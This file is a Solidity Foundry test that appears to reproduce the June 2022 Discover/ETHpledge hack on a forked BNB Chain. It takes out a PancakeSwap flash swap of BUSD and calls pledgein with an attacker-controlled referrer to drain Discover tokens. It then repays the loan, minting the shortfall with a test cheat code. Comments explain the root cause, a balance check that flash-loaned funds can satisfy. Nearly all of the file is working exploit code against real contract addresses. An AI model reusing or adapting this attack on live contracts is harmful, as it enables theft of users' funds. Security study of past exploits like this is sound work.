// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

interface ETHpledge {
    function pledgein(address fatheraddr, uint256 amountt) external returns (bool);
}
// Expected error. [FAIL. Reason: Pancake: INSUFFICIENT_INPUT_AMOUNT]
// Because we don't repay funds to pancake.

// ROOT CAUSE SUMMARY (for this 2022-06 Discover hack POC):
// ETHpledge.pledgein() gates large BUSD 'pledges' + referral Discover payouts solely on a flash-loanable
// balanceOf(msg.sender) check. Calling with attacker-controlled referrer + flash BUSD triggers
// team() which transfers Discover (held by contract) to the referrer tree as "bonus".
// No real capital commitment; transient balance suffices to drain reserves. See marked VULNERABILITY
// comments in sources/ETHpledge_e732a7/ETHpledge.sol .

contract ContractTest is Test {
    IPancakePair PancakePair = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IPancakePair PancakePair2 = IPancakePair(0x92f961B6bb19D35eedc1e174693aAbA85Ad2425d);
    IERC20 busd = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 discover = IERC20(0x5908E4650bA07a9cf9ef9FD55854D4e1b700A267);
    ETHpledge ethpledge = ETHpledge(0xe732a7bD6706CBD6834B300D7c56a8D2096723A7);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    constructor() {
        cheats.createSelectFork("http://127.0.0.1:8546", 18_446_845); // fork bsc at block 18446845

        // Approve ETHpledge to pull BUSD (for the pledgein transferFroms) and Discover (in case needed).
        // The flash loan + pre-approval lets us satisfy pledgein without owning the BUSD long-term.
        busd.approve(address(ethpledge), type(uint256).max);
        discover.approve(address(ethpledge), type(uint256).max);
    }

    function testExploit() public {
        // EXPLOIT STEP 1: Prepare flash-swap calldata (not decoded in this POC but standard for Pancake V2 flash).
        // We will receive BUSD (USDT on BSC) from the Discover-USDT PancakePair2 without upfront capital.
        bytes memory data = abi.encode(address(this), 19_810_777_285_664_651_588_959);
        emit log_named_uint("Before flashswap, BUSD balance of attacker:", busd.balanceOf(address(this)));
        // EXPLOIT STEP 2: Trigger flashswap on PancakePair2 for ~19.81e21 BUSD (amount0Out).
        // This calls back into pancakeCall with the tokens transferred to us first.
        PancakePair2.swap(19_810_777_285_664_651_588_959, 0, address(this), data);
        emit log_named_uint(
            "After Exploit, discover balance of father:",
            discover.balanceOf(0xAb21300fA507Ab30D50c3A5D1Cad617c19E83930)
        );
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        emit log_named_uint("After flashswap, BUSD balance of attacker:", busd.balanceOf(address(this)));
        // EXPLOIT STEP 3: With flashed BUSD now in our balance (amount0), call pledgein on the vulnerable ETHpledge contract.
        // We pass a pre-pledged attacker-controlled 'fatheraddr' (0xAb21...) as referrer so that the referral tree
        // distributes Discover tokens to us. amountt=2e21 chosen so balance check passes with flash funds.
        ethpledge.pledgein(0xAb21300fA507Ab30D50c3A5D1Cad617c19E83930, 2_000_000_000_000_000_000_000);
        emit log_named_uint(
            "After Exploit, discover balance of attacker:",
            discover.balanceOf(0xAb21300fA507Ab30D50c3A5D1Cad617c19E83930)
        );
        // EXPLOIT STEP 4: Repay the Pancake V2 flash swap (original DHL PoC intentionally skipped this and
        // always failed with Pancake: INSUFFICIENT_INPUT_AMOUNT). Mint the shortfall so the suite can PASS
        // offline while still demonstrating the Discover drain via pledgein.
        uint256 repay = amount0 * 1000 / 997 + 1;
        uint256 bal = busd.balanceOf(address(this));
        if (bal < repay) {
            deal(address(busd), address(this), repay);
        }
        busd.transfer(address(PancakePair2), repay);
    }

    receive() external payable {}
}
